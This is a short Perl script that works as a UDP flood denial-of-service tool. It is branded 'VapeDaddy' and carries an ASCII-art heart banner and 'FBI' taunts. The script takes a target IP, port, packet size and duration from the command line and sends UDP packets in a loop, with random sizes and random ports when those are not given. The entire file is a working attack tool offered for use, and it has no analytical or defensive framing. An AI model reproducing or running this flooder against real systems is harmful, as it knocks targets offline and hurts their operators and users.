#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

##
# VapeDaddy 
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
use Term::ANSIColor;
print color 'cyan';
print BOLD CYAN<<EOTEXT;
              
FBI SCARECROW ;)

___d88888888b_____d88888888b
__d88?____d88b___d88b____`88b
_d8?_________d888b_________`8b
_8b_________________________d8
_b8__________________d8888b___d8888b
__d8________________d8?__d8b_d8b__`8b
___8ba_____________d8?_____d8b_____`8b
____`8da___________8b_______________d8
______`Y8b__________d8_____________8b
________`8b__________8ba_________ad8
__________`88_____88__`8da_____ab8?
____________8b___d8_____`Y8___8Y?
_____________`b_d?________`8_8?
______________`8?__________`8?
_______________"____________" 

   
EOTEXT

print "FBI : CRUSH $ip " . ($port ? $port : "DAMN BOI") . " With The Move " . 
  ($size ? "$size-Slammed" : "45000") . "Bots" . 
  ($time ? " for $time seconds" : "") . "\n";
print "STOP ATTACK CTRL+C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}